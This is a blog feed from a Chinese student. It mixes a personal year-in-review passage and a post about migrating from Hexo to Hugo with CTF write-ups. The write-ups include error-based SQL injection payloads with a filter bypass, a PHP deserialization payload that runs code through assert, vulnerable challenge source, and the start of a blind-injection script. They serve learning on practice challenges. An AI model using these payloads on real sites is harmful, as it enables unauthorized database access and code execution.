&lt;p>还有一天，外面狂风大作，感觉吹得风打的雷劈的闪电都能把楼给拆了，但是那天却可以在宿舍里暖暖和和的打游戏，头一次在宿舍感觉到了家的感觉😂（过了几天还有一件大事，只我知道，标下日期2021.6.4）&lt;/p>
&lt;p>在我姐那，刚好举着手机拍外面，发现了一个自由的气球上天了&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/image-20220203232532148.png" alt="image-20220203232532148">&lt;/p>
&lt;p>在我姐那玩的健身环，这游戏雀食好啊，雀食好&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/image-20220203232629974.png" alt="image-20220203232629974">&lt;/p>
&lt;p>人生第一次出去打比赛去河大打的，大佬说比赛是非常非常非常非常非常非常水的比赛，我们组只拿了三等奖，不过算是体验一把了，下面这个颁奖仪式还有个视频被传网上很火，B站视频找不到了，贴个&lt;a href="https://baijiahao.baidu.com/s?id=1703496081195246883">相关的新闻&lt;/a>里面有视频。主要还是体验一把学校报销费用打比赛。&lt;/p>
&lt;p>今天在学校还学成了点外卖，一个星期就要去吃一次汉堡，主要还是学校食堂太小，一进里面就根本想不出哪家的饭还能吃下，越想越想直接扭头回宿舍。为此我还在闲鱼上买了个饿了吗年卡，30块，有点膈应的就是会找你要验证码，在卖家哪登陆，这么便宜主要还是把淘宝上的88会员给拆开卖了，我还买过一年的网易云黑胶40多。&lt;/p>
&lt;p>这是半个榴莲，我同学的表弟给他送过去吃，他带回宿舍室友都不吃，臭味多少有点冲，吃不完就给我了，我和我一个室友知道这榴莲可是大补，两个人一会儿怼了一半😋&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/image-20220203235536483.png" alt="image-20220203235536483">&lt;/p>
&lt;p>下半年打的全国大学生信息安全竞赛，本来我觉得自己刚加集训队菜的离谱，大佬们还是带着我组了四人队，先是线上赛打了两天，集训队的两个队伍进分赛区了，接下来去的武汉华科大打的，看了看人家学校真的是慕的直流口水，人家这学校才叫大学。分赛区的举办方在有点远的地方包了酒店，原价380一晚的房间选手只用100多还是200多我忘了，反正那个酒店是我目前住过最豪华的（反正自己也没住过多少酒店就是了），大大的落地窗还有小冰柜，冰柜里面还有可乐雪碧，太爽咯！早上自助餐也挺丰盛。&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/202202041228579.png" alt="image-20220204122812777">&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/202202041218645.png" alt="image-20220204121250689">&lt;/p>
&lt;p>选手就位&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/202202041218688.png" alt="image-20220204121427306">&lt;/p>
&lt;p>最后成绩是打了分赛区的第二名一等奖，有了总决赛资格，分赛区第一名是三巨头实在打不过。打完比赛回学校集训队老师还发了新闻到学校官网，人生第一次上学校官网新闻。&lt;/p>
&lt;p>同学空间整活，直呼太艺术了&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/202202041218511.png" alt="image-20220204121816989">&lt;/p>
&lt;h1 id="7月">7月&lt;/h1>
&lt;p>&lt;strong>最奇妙的一个月&lt;/strong>&lt;/p>
&lt;p>在家里屋顶上拍的好风景&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/202202041220290.png" alt="image-20220204122042961">&lt;/p>
&lt;p>接下来就是去哈工大打总决赛，是第二次坐飞机，第一次坐飞机是和我姐去贝加尔湖。专门挑的挨窗户的位置，但是这个窗户有划痕拍的不好看&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/202202041224785.png" alt="image-20220204122455470">&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/202202041225871.png" alt="image-20220204122518187">&lt;/p>
&lt;p>飞机餐没啥看的就不放了，还有一张拍了很小很小很小的月亮&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/202202041226179.png" alt="image-20220204122638400">&lt;/p>
&lt;p>哈尔滨站&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/202202041227088.png" alt="image-20220204122724866">&lt;/p>
&lt;p>刚到的第一个酒店进去就一股霉味，然后整个房间都是那种很阴森的感觉，我们四个人都觉的不太舒服就换了个。&lt;/p>
&lt;p>第一次去哈工大&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/202202062252119.png" alt="image-20220206225235384">&lt;/p></description></item><item><title>博客搬迁</title><link>/posts/play_time/%E5%8D%9A%E5%AE%A2%E6%90%AC%E8%BF%81/</link><pubDate>Mon, 31 Jan 2022 11:31:54 +0800</pubDate><guid>/posts/play_time/%E5%8D%9A%E5%AE%A2%E6%90%AC%E8%BF%81/</guid><description>&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/202201311142110.jpg" alt="202201311142110">&lt;/p>
&lt;p>大四开始写毕业设计了，在学的过程中想记一记笔记，但是之前的hexo博客没动很久了，就想着把博客搬迁下顺便起个头，激起一些学习的劲头。&lt;/p>
&lt;h1 id="为什么选择hugo">为什么选择Hugo&lt;/h1>
&lt;p>因为静态的网站生成框架也没几个，搜索的时候也就hexo、hugo、jekyll。之前用的hexo确实很顺手，但是自己改网站，加功能的时候搞了好多&lt;strong>依赖&lt;/strong>，感觉很臃肿，当时的博客文件夹带上依赖大概就有500+MB，现在换了hugo看下是90MB。&lt;/p>
&lt;p>hugo还有一个特点就是生成网站的速度很快。这一点我没有截图作比较，但是明显的感觉hugo比hexo快好多。引用一片文章里的一句话：&lt;/p>
&lt;blockquote>
&lt;p>根据相关博主提供的数据，他200篇左右的博文用Hexo 需要10分钟去生成静态网页，而Hugo 只需要10秒。&lt;/p>&lt;/blockquote>
&lt;p>所以感觉要是长期写东西的话，&lt;strong>选个好的框架也是个长远的选择&lt;/strong>。&lt;/p>
&lt;p>hugo在github上的⭐也比hexo多。&lt;/p>
&lt;p>&lt;img src="https://github-readme-stats.vercel.app/api/pin/?username=gohugoio&amp;amp;repo=hugo" alt="Readme Card">&lt;/p>
&lt;p>&lt;img src="https://github-readme-stats.vercel.app/api/pin/?username=hexojs&amp;amp;repo=hexo" alt="Readme Card">&lt;/p>
&lt;p>不过在迁移的过程中，最大的感受就是：&lt;strong>Hugo在国内的使用者不多&lt;/strong>。&lt;/p>
&lt;p>网上想要找个合适的教程非常难，然后就是去官网啃英文的文档。而且hugo框架和hexo比起来完全的不一样，鄙人go还没接触过，主要还是自己菜。一开始选了&lt;a href="https://github.com/luizdepra/hugo-coder">coder&lt;/a>这个主题，但是觉得还是对hugo本身的了解不够多，四处碰壁，最后选择了一个有国人维护的也是我现在在用的主题，就是&lt;a href="https://github.com/HEIGE-PCloud/DoIt">DoIt&lt;/a>，这个主题也是从上一代的主题迭代下来的，因为原来的那个已经很久没有维护了(可能觉得已经完工了)。这个主题的教程也很友好，摸完感觉我有点上手了。&lt;/p>
&lt;h1 id="博客的部署">博客的部署&lt;/h1>
&lt;p>之前使用hexo，在最后使用的时候发现了&lt;a href="https://www.travis-ci.com/">Travis CI - Test and Deploy with Confidence&lt;/a> &lt;strong>持续集成&lt;/strong>这个好东西，每次在本地写完博客以后push到github的仓库，然后这个app会自动构建博客发布到github pages。&lt;/p>
&lt;p>所以这次也是一样的选择，一个仓库用来放博客本体(顺便当一个备份)，使用持续集成发布到github pages和自己服务器里。不过这次学到的是github Actions。因为之前有用过一些自动签到的脚本，所以这个东西也略有了解，差不多就借一个生产环境干一些事情。具体的配置github的官方docs也写的比较清楚还有中文翻译，上手还看了一篇阮老师的博客&lt;a href="https://www.ruanyifeng.com/blog/2019/09/getting-started-with-github-actions.html">GitHub Actions 入门教程&lt;/a>。&lt;/p>
&lt;p>发布到自己服务器上那块感觉处理的还不是很好，找了好几种方法：ftp上传、webhook，最后用了执行git clone的命令从github pages拉仓库。&lt;/p>
&lt;p>所以最后的部署的流程就是：&lt;/p>
&lt;blockquote>
&lt;p>本地push到github仓库	&amp;ndash;&amp;gt;	仓库Actions发布到github pages、服务器拉取page仓库。&lt;/p>&lt;/blockquote></description></item><item><title>CISCN线上赛库存</title><link>/posts/ctf/ciscn%E7%BA%BF%E4%B8%8A%E8%B5%9B%E5%BA%93%E5%AD%98/</link><pubDate>Wed, 18 Aug 2021 17:21:24 +0000</pubDate><guid>/posts/ctf/ciscn%E7%BA%BF%E4%B8%8A%E8%B5%9B%E5%BA%93%E5%AD%98/</guid><description>&lt;h1 id="easy_sql">easy_sql&lt;/h1>
&lt;p>在用户名处，尝试sql注入，加上单引号报错，测试闭合，随便添加几个符号在password的报错附近中注意到了是&lt;strong>括号单引号闭合&lt;/strong>&lt;/p>
&lt;blockquote>
&lt;p>You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &amp;lsquo;1&amp;rsquo;) LIMIT 0,1&amp;rsquo; at line 1&lt;/p>&lt;/blockquote>
&lt;p>过滤的字符有union，所以尝试报错注入，查询版本号。&lt;/p>
&lt;pre tabindex="0">&lt;code>admin&amp;#39;) and (extractvalue(1,concat(0x7e,(select version()),0x7e)))#
&lt;/code>&lt;/pre>&lt;p>接下来想要通过&lt;strong>information_schema&lt;/strong>库查字段，但是发现被过滤了，所以猜表名和字段名，尝试出了flag表和表中的一个字段id，但是在id字段中只查询出了一个值：1，使用sqlmap跑也没跑出来。&lt;/p>
&lt;p>最后参考了网上的一篇文章：&lt;a href="https://blog.csdn.net/weixin_35867608/article/details/113937118">mysql 注入 information_schema_绕过IDS过滤information_schema继续注入&lt;/a>，模仿文章构造payload&lt;/p>
&lt;pre tabindex="0">&lt;code>admin&amp;#39;) and (extractvalue(1,concat(0x7e,(select * from (select * from flag a join flag b USING (id))c),0x7e)))#
&lt;/code>&lt;/pre>&lt;p>回显为：Duplicate column name &amp;rsquo;no&amp;rsquo;，一开始以为是报了个错，但是根据文章使用using继续把查到的no字段加上去，发现还有其他字段&lt;/p>
&lt;pre tabindex="0">&lt;code>Duplicate column name &amp;#39;28d9f90a-4120-4ee8-9079-4e7613699510&amp;#39;
&lt;/code>&lt;/pre>&lt;p>直接得到一个假的flag，真的还在flag表中，查询flag表中的改字段，报错注入长度有限制，所以加个substr一段一段截就出来了&lt;/p>
&lt;pre tabindex="0">&lt;code>admin&amp;#39;) and (extractvalue(1,concat(0x7e,substr((select `28d9f90a-4120-4ee8-9079-4e7613699510` from `flag`),1,30),0x7e)))#
&lt;/code>&lt;/pre>&lt;p>flag：CISCN{SWAqt-siWro-Wi7jV-FTdRm-9iOkG-}&lt;/p>
&lt;h1 id="easy_source">easy_source&lt;/h1>
&lt;p>使用目录扫描，扫描到了&lt;code>.index.php.swo&lt;/code>&lt;/p></description></item><item><title>ReadlezPHP&amp;EasySearch</title><link>/posts/ctf/readlezphpeasysearch/</link><pubDate>Tue, 20 Apr 2021 17:12:43 +0000</pubDate><guid>/posts/ctf/readlezphpeasysearch/</guid><description>&lt;h1 id="readlezphp">ReadlezPHP&lt;/h1>
&lt;p>源码找到&lt;code>time.php?source&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210420175641.png" alt="">&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#a6e22e">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#error_reporting(0);
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">HelloPhp&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> $a;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> $b;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">function&lt;/span> __construct(){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $this&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#a6e22e">a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;Y-m-d h:i:s&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $this&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#a6e22e">b&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;date&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">function&lt;/span> __destruct(){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $a &lt;span style="color:#f92672">=&lt;/span> $this&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#a6e22e">a&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $b &lt;span style="color:#f92672">=&lt;/span> $this&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#a6e22e">b&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">echo&lt;/span> $b($a);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$c &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> &lt;span style="color:#a6e22e">HelloPhp&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#a6e22e">isset&lt;/span>($_GET[&lt;span style="color:#e6db74">&amp;#39;source&amp;#39;&lt;/span>]))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">highlight_file&lt;/span>(&lt;span style="color:#66d9ef">__FILE__&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">die&lt;/span>(&lt;span style="color:#ae81ff">0&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">@&lt;/span>$ppp &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">unserialize&lt;/span>($_GET[&lt;span style="color:#e6db74">&amp;#34;data&amp;#34;&lt;/span>]);
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>分析一波：最后一行一个反序列化，所以很明显是反序列化的题目，在&lt;code>HelloPhp&lt;/code>中有一个&lt;code>__destruct&lt;/code>方法，会在创建的对象销毁时执行，注意里面有一个echo输出，最重要的是后面的函数调用 ，好像是在PHP7某个版本之后只是使用形如&lt;code>$a($b)&lt;/code>格式进行函数调用，假如变量&lt;code>a&lt;/code>为字符串&lt;code>var_dump&lt;/code>，&lt;code>b&lt;/code>是任意字符串，就相当于调用var_dump函数且参数为b。&lt;/p>
&lt;p>所以构造反序列化，调用assert函数执行phpinfo。如果向&lt;strong>assert()&lt;/strong> 函数传递字符串，它将会被 &lt;strong>assert()&lt;/strong> 当做 PHP 代码来执行)：&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;lt;?php
class HelloPhp
{
 public $a=&amp;#39;phpinfo()&amp;#39;;
 public $b=&amp;#39;assert&amp;#39;;
}

$s=new HelloPhp();
echo serialize($s);
&lt;/code>&lt;/pre>&lt;p>POST请求&lt;/p>
&lt;pre tabindex="0">&lt;code>time.php?data=O:8:&amp;#34;HelloPhp&amp;#34;:2:{s:1:&amp;#34;a&amp;#34;;s:9:&amp;#34;phpinfo()&amp;#34;;s:1:&amp;#34;b&amp;#34;;s:6:&amp;#34;assert&amp;#34;;}
&lt;/code>&lt;/pre>&lt;p>页面查找flag，在environment中找到flag&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210420175822.png" alt="">&lt;/p>
&lt;h1 id="easysearch">EasySearch&lt;/h1>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210420171541.png" alt="">&lt;/p>
&lt;p>进入页面以后试了试sql注入发现没用。第一步是看了wp找到的：使用扫描器扫描到&lt;code>index.php.swp&lt;/code>文件：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#a6e22e">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#a6e22e">ob_start&lt;/span>();
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">get_hash&lt;/span>(){
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		$chars &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&amp;amp;*()+-&amp;#39;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		$random &lt;span style="color:#f92672">=&lt;/span> $chars[&lt;span style="color:#a6e22e">mt_rand&lt;/span>(&lt;span style="color:#ae81ff">0&lt;/span>,&lt;span style="color:#ae81ff">73&lt;/span>)]&lt;span style="color:#f92672">.&lt;/span>$chars[&lt;span style="color:#a6e22e">mt_rand&lt;/span>(&lt;span style="color:#ae81ff">0&lt;/span>,&lt;span style="color:#ae81ff">73&lt;/span>)]&lt;span style="color:#f92672">.&lt;/span>$chars[&lt;span style="color:#a6e22e">mt_rand&lt;/span>(&lt;span style="color:#ae81ff">0&lt;/span>,&lt;span style="color:#ae81ff">73&lt;/span>)]&lt;span style="color:#f92672">.&lt;/span>$chars[&lt;span style="color:#a6e22e">mt_rand&lt;/span>(&lt;span style="color:#ae81ff">0&lt;/span>,&lt;span style="color:#ae81ff">73&lt;/span>)]&lt;span style="color:#f92672">.&lt;/span>$chars[&lt;span style="color:#a6e22e">mt_rand&lt;/span>(&lt;span style="color:#ae81ff">0&lt;/span>,&lt;span style="color:#ae81ff">73&lt;/span>)];&lt;span style="color:#75715e">//Random 5 times
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>		$content &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">uniqid&lt;/span>()&lt;span style="color:#f92672">.&lt;/span>$random;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#a6e22e">sha1&lt;/span>($content); 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">header&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;Content-Type: text/html;charset=utf-8&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#f92672">***&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span>(&lt;span style="color:#a6e22e">isset&lt;/span>($_POST[&lt;span style="color:#e6db74">&amp;#39;username&amp;#39;&lt;/span>]) &lt;span style="color:#66d9ef">and&lt;/span> $_POST[&lt;span style="color:#e6db74">&amp;#39;username&amp;#39;&lt;/span>] &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $admin &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;6d0bc1&amp;#39;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( $admin &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#a6e22e">substr&lt;/span>(&lt;span style="color:#a6e22e">md5&lt;/span>($_POST[&lt;span style="color:#e6db74">&amp;#39;password&amp;#39;&lt;/span>]),&lt;span style="color:#ae81ff">0&lt;/span>,&lt;span style="color:#ae81ff">6&lt;/span>)) {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;lt;script&amp;gt;alert(&amp;#39;[+] Welcome to manage system&amp;#39;)&amp;lt;/script&amp;gt;&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $file_shtml &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;public/&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#a6e22e">get_hash&lt;/span>()&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#e6db74">&amp;#34;.shtml&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $shtml &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">fopen&lt;/span>($file_shtml, &lt;span style="color:#e6db74">&amp;#34;w&amp;#34;&lt;/span>) &lt;span style="color:#66d9ef">or&lt;/span> &lt;span style="color:#66d9ef">die&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;Unable to open file!&amp;#34;&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $text &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> ***
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> ***
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> &amp;lt;h1&amp;gt;Hello,&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>$_POST[&lt;span style="color:#e6db74">&amp;#39;username&amp;#39;&lt;/span>]&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;lt;/h1&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> ***
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">			***&amp;#39;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">fwrite&lt;/span>($shtml,$text);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">fclose&lt;/span>($shtml);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">***&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>			&lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#e6db74">&amp;#34;[!] Header error ...&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">echo&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;lt;script&amp;gt;alert(&amp;#39;[!] Failed&amp;#39;)&amp;lt;/script&amp;gt;&amp;#34;&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }&lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#f92672">***&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#f92672">***&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">?&amp;gt;&lt;/span>&lt;span style="color:#960050;background-color:#1e0010">
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>登陆功能又一个验证，需要传入的&lt;code>passwd&lt;/code>参数使用&lt;strong>md5&lt;/strong>加密以后是以&lt;strong>6d0bc1&lt;/strong>开头的。简单写个脚本跑一下就有了：&lt;/p></description></item><item><title>极客大挑战 2019 FinalSQL</title><link>/posts/ctf/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019finalsql/</link><pubDate>Sun, 18 Apr 2021 19:11:51 +0000</pubDate><guid>/posts/ctf/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019finalsql/</guid><description>&lt;p>还是同一场比赛的界面&lt;/p>
&lt;p>&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210416224503.png" alt="">&lt;/p>
&lt;p>这次测试了下面的登陆框已经不能用了，无论怎么输入都是同一个回显：&lt;strong>你可别被我逮住了，臭弟弟&lt;/strong>，测试上面的序号，注意此时的url中有&lt;code>?id=&lt;/code>猜测是一个注入点，输入单引号一直报错，但是输入2-1时成功回显，判断是一个&lt;strong>数字型&lt;/strong>注入，数字型注入最多遇到的就是结合盲注，接下来是测试盲注的过滤。&lt;/p>
&lt;p>发现if、union、and等被过滤，在整个字符串中如果出现空格会被拦下，ord、ascii等转换字符没有被过滤，if被过滤可以使用strcmp函数等代替，空格可以使用括号绕过。&lt;/p>
&lt;p>贴出来自己的脚本：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># codeing=utf-8&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> requests
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> time
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>url&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;http://1e069783-5d06-4d70-af82-c457e0d11a52.node3.buuoj.cn/search.php?id=&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>result&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">for&lt;/span> x &lt;span style="color:#f92672">in&lt;/span> range(&lt;span style="color:#ae81ff">1&lt;/span>, &lt;span style="color:#ae81ff">100&lt;/span>):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	high &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">127&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	low &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">32&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	mid &lt;span style="color:#f92672">=&lt;/span> (low &lt;span style="color:#f92672">+&lt;/span> high) &lt;span style="color:#f92672">//&lt;/span> &lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>	&lt;span style="color:#66d9ef">while&lt;/span> high&lt;span style="color:#f92672">&amp;gt;&lt;/span>low:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>		&lt;span style="color:#75715e"># sql=&amp;#34;(ORD(SUBSTR((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%d,1))=%d)&amp;#34;%(i,c)&lt;/span>
